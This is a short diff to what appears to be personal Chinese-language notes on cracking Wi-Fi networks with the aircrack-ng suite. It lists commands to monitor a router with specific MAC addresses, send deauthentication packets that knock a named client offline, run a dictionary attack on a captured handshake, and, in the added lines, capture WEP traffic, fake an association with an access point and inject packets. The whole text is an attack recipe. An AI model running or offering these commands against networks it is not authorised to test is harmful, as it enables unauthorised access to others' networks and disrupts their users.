@@ -1,3 +1,19 @@
 airodump-ng --ivs --bssid D8:15:0D:CE:4D:B8 -c 1 -w cap/al mon1  监控某一路由是否有客户端
 aireplay-ng -0 10 -a 08:10:77:48:D1:FF -c F0:F6:1C:1E:E3:C8 mon0 #这里可以更改一个次数
 airecrack-ng -w dic.txt  wapcap.cap    跑字典
+
+Jul 17 2015
+
+抓包：
+airodump-ng -c 6 --bssid AP's MAC -w wep mon0
+-c  频道   --bssid 要破解AP的MAC  -w 保存数据包的名字
+
+与AP建立虚拟链接：
+aireplay-ng -1 0 -a AP's MAC -h My MAC mon0
+-h 后面跟着自己的无线网卡MAC 
+
+注入：
+aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b AP's MAC -h My MAC mon0
+
+airmon-ng stop mon0
+
